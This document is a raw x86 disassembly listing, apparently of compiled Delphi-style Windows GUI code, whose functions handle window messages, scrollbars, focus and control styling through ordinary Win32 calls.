lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_4418a8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4074a8
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_442424
jmp r-xdata
sub_433168
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43341f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44733c
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44740c
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_432eb0
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_462918
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_4038bc
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4592cc
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430f60
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4474d4
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe4 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_432eb0
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_432ed4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_433444
push ebx
push esi
push edi
mov edi edx
mov esi eax
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ edi ]
sub eax 0x5
je r-xdata
mov ebx [ edi ]
cmp ebx 0x201
je r-xdata
cmp [ esi + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax esi
call sub_4424ec
test al al
jne r-xdata
cmp ebx 0x203
jne r-xdata
mov edx edi
mov eax esi
call sub_445f34
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_4474d4
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bx [ edi + 0x4 ]
cmp bx 0xd
je r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_421054
push eax
mov eax [ edi + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_421cd8
call sub_421054
push eax
mov eax [ edi + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_421d14
mov [ edi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx edi
mov eax esi
call sub_445ea0
test al al
jne r-xdata
mov eax esi
call sub_432eb0
test al al
je r-xdata
cmp bx 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ esi + 0x54 ]
mov [ esi + 0x54 ] ax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax esi
call sub_432ed4
jmp r-xdata
sub_433552
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4336b0
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4336b7
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
jmp [ eax * 4 + jump_table_433580 ]
mov eax edi
mov si 0xffe9
call sub_4038bc
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_4038bc
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_4038bc
mov eax edi
mov edx [ eax ]
call [ edx + 0xec ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_441d94
mov eax edi
mov si 0xffeb
call sub_4038bc
mov eax edi
mov si 0xffb2
call sub_4038bc
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_4038bc
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_446c6c
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_446d58
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_448484
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_448484
push eax
call PostMessageA
jmp r-xdata
sub_433704
push esi
push edi
mov esi eax
mov eax esi
call sub_443e3c
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_43372c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_433780
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_4038bc
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_4337ac
push ebx
mov ebx eax
mov eax ebx
call sub_44550c
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_448484
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_4337e4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_43387a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xf8 ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433881
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_433881
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_4338a0
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_4338d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43394f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433956
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd0 ]
sub_43395c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_43399c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_4339e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4339ec
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_4339f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444260
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_433a18
push ebx
mov ebx eax
mov eax ebx
call sub_44e12c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_433a50
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_433aa6
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_433ab4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444294
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_433b08
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_448f54
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc4 ]
test al al
jne r-xdata
sub_433b5c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433b80
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_445f34
mov eax ebx
mov si 0xffb5
call sub_4038bc
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_448484
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_4038bc
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_433bf8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433ab4
mov edx 0x61
mov eax esi
call sub_441520
mov edx 0x11
mov eax esi
call sub_441544
mov dl 0x1
mov eax esi
call sub_4486b8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_433c64
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_4038bc
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_433c90
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_433d18
retn
mov dl 0x2
call sub_433d18
jmp r-xdata
xor edx edx
call sub_433d18
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_433d18
jmp r-xdata
sub_433d18
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_448788
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_4038bc
sub_433d6c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4453e0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44530c
mov eax ebx
mov si 0xffc8
call sub_4038bc
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_433dc7
add [ ebx - 0x75 ] dl
fmul [ ebx + 0x173ae8c3 ]
add [ eax ] eax
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ebx
retn
sub_433e10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433e9e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_441d64
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45925c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_447954
mov eax ebx
mov si 0xffb8
call sub_4038bc
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
mov eax ebx
mov si 0xffb5
call sub_4038bc
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433ea5
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_433ebc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433ab4
mov edx 0x71
mov eax esi
call sub_441520
mov edx 0x11
mov eax esi
call sub_441544
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_433f24
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_4038bc
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_433f64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_445284
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_445248
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44e3c0
sub_434020
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4486b8
mov eax [ ebp - 0x4 ]
call sub_448788
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SendMessageA
push ebp
call sub_433f64
pop ecx
mov eax [ ebp - 0x4 ]
call sub_441970
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_4038bc
sub_4340ac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4453e0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44530c
mov eax ebx
mov si 0xffc8
call sub_4038bc
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_434103
add [ ebx - 0x75 ] dl
fmul [ ebx + 0x13fee8c3 ]
add [ eax ] eax
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_448484
push eax
call SendMessageA
pop ebx
retn
sub_434138
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4341ad
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_441d64
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45925c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_447954
mov eax ebx
mov si 0xffb8
call sub_4038bc
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4341b4
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_4341bc
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc8 ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_4038bc
jmp r-xdata
pop esi
retn
sub_4341ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444294
mov edx 0x79
mov eax esi
call sub_441520
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_441544
mov dl 0x1
mov eax esi
call sub_4486b8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_4342a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4453e0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44530c
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_4343e4
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_4038bc
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434334
call sub_441704
mov eax ebx
call sub_44550c
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_441724
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_448484
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_448484
push eax
call SetScrollInfo
mov eax ebx
call sub_4343e4
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_448484
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_448484
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_4343e4
push ebx
mov ebx eax
mov eax ebx
call sub_4423a8
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_434404
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_445ac0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_434440
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_434577
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_448788
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_448484
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43457e
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_448788
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_4038bc
mov eax ebx
call sub_4343e4
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_448484
